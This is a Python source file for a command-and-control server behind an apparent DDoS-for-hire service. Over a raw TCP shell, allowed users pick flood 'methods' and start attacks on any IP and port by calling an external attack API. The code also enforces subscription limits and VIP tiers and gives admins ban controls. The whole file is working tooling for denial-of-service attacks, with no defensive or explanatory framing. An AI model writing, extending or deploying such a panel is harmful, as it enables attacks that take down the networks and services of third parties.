import requests
import socket
import threading
import time as time_module
import os
import datetime
import json
import shutil
import readline
import ipaddress
import sys
import subprocess

__version__ = "1.1"

LOG_FILE = "cnc_log.txt"
CONFIG_FILE = "cnc_config.json"

def read_file(file_name):
    with open(file_name, "r") as f:
        return [line.strip() for line in f]

def load_config():
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

config = load_config()
API_URL = config['api_url']
RAW_PORT = config['cnc_port']

def is_ip_allowed(ip, allowed_ips, banned_ips, allowed_ips_with_limits):
    expiration_date_str = get_expiration_date(ip, allowed_ips_with_limits)
    if expiration_date_str:
        expiration_date = datetime.datetime.strptime(expiration_date_str, "%Y-%m-%d").date()
        if datetime.date.today() > expiration_date:
            return False
    return ip in allowed_ips and ip not in banned_ips

def is_ip_admin(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data.get('admin_user', 'no') == 'yes'
    return False

def is_ip_whitelisted(ip, whitelist):
    return ip in whitelist

def get_time_limit(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data['time_limit']
    return None

def get_attack_limit(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data['attack_limit']
    return None

def is_user_vip(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data.get('vip', False)
    return False

def get_threads_limit(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data['threads_limit']
    return None

def get_connection_limit(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data['connection_limit']
    return None

def get_nickname(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data.get('nickname', 'User')
    return "User"

def get_expiration_date(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data.get('expiration_date', None)
    return None

def execute_attack(api_key, method, ip, port, time, threads):
    data = {
        "api_key": api_key,
        "ip": ip,
        "port": port,
        "time": time,
        "threads": threads,
        "method": method,
    }

    response = requests.post(f"{API_URL}/start_attack", data=data)
    return response.json()

def log_activity(log_message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"[{timestamp}] {log_message}\n")

def apply_config(conn, config):
    conn.send(f"\033[1;{config['text_color']}m".encode('utf-8'))  # Apply text color
    conn.send(f"\033[4{config['background_color']}m".encode('utf-8'))  # Apply background color

def print_login_message(conn, methods, config, nickname, addr, allowed_ips_with_limits):
    conn.send(b"\033[2J\033[H")  # ANSI escape code to clear the screen
    conn.send(f"\033[{config['text_color']};{config['background_color']}m".encode('utf-8'))  # Set text and background color
    conn.send(b"Welcome to the CNC CLI\r\n")
    conn.send(f"Hello, {nickname}\r\n".encode('utf-8'))
    conn.send(b"Available methods:\r\n")
    for method in methods:
        conn.send(f"{method}\r\n".encode('utf-8'))
    if is_user_vip(addr[0], allowed_ips_with_limits):
        conn.send(b"VIP methods:\r\n")
        for vip_method in config['vip_methods']:
            conn.send(f"{vip_method}\r\n".encode('utf-8'))

def is_valid_ipv4_address(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def is_valid_port(port):
    try:
        port_number = int(port)
        return 1 <= port_number <= 65535
    except ValueError:
        return False

def is_valid_time(time):
    try:
        time_value = int(time)
        return time_value > 0
    except ValueError:
        return False

def client_handler(conn, addr, connection_counter):
    try:
        config = load_config()
        api_key = config['api_key']
        methods = config['methods']
        allowed_ips_with_limits = config['allowed_ips']
        admin_ips = [ip for ip in allowed_ips_with_limits.keys() if is_ip_admin(ip, allowed_ips_with_limits)]

        if addr[0] not in allowed_ips_with_limits.keys() and addr[0] not in admin_ips:
            print(f"Rejected connection from {addr[0]}:{addr[1]} (IP not allowed)")
            conn.send(b"Your IP address is not allowed to access this CNC CLI.\n")
            conn.close()
            log_activity(f"Failed login from {addr[0]}:{addr[1]} (IP not allowed)")
            return
        elif addr[0] in config['banned_ips']:
            print(f"Rejected connection from {addr[0]}:{addr[1]} (IP banned)")
            conn.send(b"Your IP address is banned from accessing this CNC CLI.\n")
            conn.close()
            log_activity(f"Failed login from {addr[0]}:{addr[1]} (IP banned)")
            return
        elif not is_ip_allowed(addr[0], allowed_ips_with_limits.keys(), config['banned_ips'], allowed_ips_with_limits):
            print(f"Rejected connection from {addr[0]}:{addr[1]} (IP expired)")
            conn.send(b"Your access to this CNC CLI has expired.\n")
            conn.close()
            log_activity(f"Failed login from {addr[0]}:{addr[1]} (IP expired)")
            return

        connection_limit = get_connection_limit(addr[0], allowed_ips_with_limits)
        if config['enable_connection_limit'] and connection_counter[addr[0]] > connection_limit:
            print(f"Rejected connection from {addr[0]}:{addr[1]} (connection limit reached)")
            conn.send(f"You have reached the connection limit of {connection_limit}.\r\n".encode('utf-8'))
            conn.close()
            log_activity(f"Failed login from {addr[0]}:{addr[1]} (connection limit reached)")
            return

        print(f"Accepted connection from {addr[0]}:{addr[1]}")
        log_activity(f"Successful login from {addr[0]}:{addr[1]}")
        nickname = get_nickname(addr[0], allowed_ips_with_limits)
        print_login_message(conn, methods, config, nickname, addr, allowed_ips_with_limits)

        used_time = 0
        ongoing_attacks = 0
        last_command_time = time_module.time()
        rate_limit_duration = 1  # 1 second between commands
        start_time = time_module.time()
        while True:
            conn.send(b">")
            command = conn.recv(1024).decode('utf-8', errors='ignore').strip().split()
            if not command:
                if time_module.time() - last_command_time >= config['auto_disconnect_time']:
                    break
                continue

            current_time = time_module.time()
            if current_time - start_time >= config['auto_disconnect_time']:
                break

            if current_time - last_command_time < rate_limit_duration:
                conn.send(f"Rate limit exceeded. Wait at least {rate_limit_duration} seconds between commands.\r\n".encode('utf-8'))
                continue
            last_command_time = current_time

            try:
                if command[0] == "exit":
                    break
                elif command[0] == "clear":
                    conn.send(b"\033[2J\033[H")  # ANSI escape code to clear the screen
                    print_login_message(conn, methods, config, nickname, addr, allowed_ips_with_limits)
                elif command[0] == "config":
                    if len(command) == 3:
                        config_key = command[1]
                        config_value = command[2]
                        if config_key in config:
                            config[config_key] = config_value
                            save_config(config)
                            conn.send(f"Configuration updated: {config_key} = {config_value}\r\n".encode('utf-8'))
                        else:
                            conn.send(f"Invalid configuration key: {config_key}\r\n".encode('utf-8'))
                    else:
                        conn.send(f"Usage: config <key> <value>\r\n".encode('utf-8'))
                elif command[0][0] == "." and command[0][1:] in methods:
                    method = command[0][1:]
                    if len(command) < 4:
                        conn.send(b"Usage: .<method> IP port time [threads]\n")
                        continue

                    ip = command[1]
                    port = command[2]
                    time = command[3]
                    threads = command[4] if len(command) > 4 else "1"  # Default threads value

                    if not is_valid_ipv4_address(ip):
                        conn.send(b"Invalid IP address.\n")
                        continue

                    if is_ip_whitelisted(ip, config['whitelist']):
                        conn.send(b"Target IP is whitelisted. Attack not allowed.\n")
                        log_activity(f"User {addr[0]}:{addr[1]} tried to attack whitelisted IP: {ip}")
                        continue

                    if not is_valid_port(port):
                        conn.send(b"Invalid port number.\n")
                        continue

                    if not is_valid_time(time):
                        conn.send(b"Invalid time value.\n")
                        continue

                    time_limit = get_time_limit(addr[0], allowed_ips_with_limits)
                    attack_limit = get_attack_limit(addr[0], allowed_ips_with_limits)
                    threads_limit = get_threads_limit(addr[0], allowed_ips_with_limits)

                    if used_time + int(time) > time_limit:
                        conn.send(f"Time limit exceeded. You have {time_limit - used_time} seconds left.\r\n".encode('utf-8'))
                        continue

                    if ongoing_attacks >= attack_limit:
                        conn.send(f"Attack limit reached. You can only run {attack_limit} attacks simultaneously.\r\n".encode('utf-8'))
                        continue

                    if int(threads) > threads_limit:
                        conn.send(f"Threads limit exceeded. You can only use up to {threads_limit} threads.\r\n".encode('utf-8'))
                        continue

                    response = execute_attack(api_key, method, ip, port, time, threads)
                    if response['success']:
                        ongoing_attacks += 1
                        used_time += int(time)
                        log_activity(f"User {addr[0]}:{addr[1]} started attack on {ip}:{port} for {time} seconds using method {method} and {threads} threads")
                        conn.send(f"Attack started on {ip}:{port} for {time} seconds using method {method} and {threads} threads.\r\n".encode('utf-8'))
                        time_module.sleep(int(time))
                        ongoing_attacks -= 1
                    else:
                        conn.send(f"Error: {response['message']}\r\n".encode('utf-8'))
                elif addr[0] in admin_ips and command[0] == "list":
                    conn.send(b"List of allowed IPs and nicknames:\n")
                    for allowed_ip, ip_data in allowed_ips_with_limits.items():
                        conn.send(f"{allowed_ip} - {ip_data.get('nickname', 'User')}\r\n".encode('utf-8'))
                elif addr[0] in admin_ips and command[0] == "ban":
                    if len(command) == 2:
                        ip_to_ban = command[1]
                        if is_valid_ipv4_address(ip_to_ban):
                            config['banned_ips'].append(ip_to_ban)
                            save_config(config)
                            conn.send(f"IP {ip_to_ban} has been banned.\r\n".encode('utf-8'))
                            log_activity(f"Admin {addr[0]}:{addr[1]} banned IP: {ip_to_ban}")
                        else:
                            conn.send(b"Invalid IP address.\n")
                    else:
                        conn.send(b"Usage: ban <IP>\n")

                elif addr[0] in admin_ips and command[0] == "unban":
                    if len(command) == 2:
                        ip_to_unban = command[1]
                        if ip_to_unban in config['banned_ips']:
                            config['banned_ips'].remove(ip_to_unban)
                            save_config(config)
                            conn.send(f"IP {ip_to_unban} has been unbanned.\r\n".encode('utf-8'))
                            log_activity(f"Admin {addr[0]}:{addr[1]} unbanned IP: {ip_to_unban}")
                        else:
                            conn.send(b"IP not found in the banned list.\n")
                    else:
                        conn.send(b"Usage: unban <IP>\n")
                else:
                    conn.send(b"Invalid command.\n")
            except Exception as e:
                conn.send(f"An error occurred while processing your command. Please contact the developer with error code: {str(e)}\r\n".encode('utf-8'))
                log_activity(f"Error while processing command from {addr[0]}:{addr[1]} - {str(e)}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        print(f"Disconnected from {addr[0]}:{addr[1]}")
        log_activity(f"Disconnected from {addr[0]}:{addr[1]}")
        if addr[0] in connection_counter:
            connection_counter[addr[0]] -= 1
        conn.close()

def start_server():
    """Start the main CNC server loop."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("", RAW_PORT))
    server_socket.listen()

    print(f"Listening for Raw connections on port {RAW_PORT}...")

    connection_counter = {}
    try:
        while True:
            conn, addr = server_socket.accept()
            if addr[0] not in connection_counter:
                connection_counter[addr[0]] = 0
            connection_counter[addr[0]] += 1
            client_thread = threading.Thread(target=client_handler, args=(conn, addr, connection_counter))
            client_thread.start()
    except KeyboardInterrupt:
        print("Shutting down the server...")

def run_with_auto_update():
    """Attempt to update the repository and restart the server."""
    try:
        subprocess.check_call(["git", "pull"])
    except Exception as e:
        print(f"Auto-update failed: {e}")
    os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)])

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--auto-update":
        run_with_auto_update()
        return
    start_server()

if __name__ == "__main__":
    main()
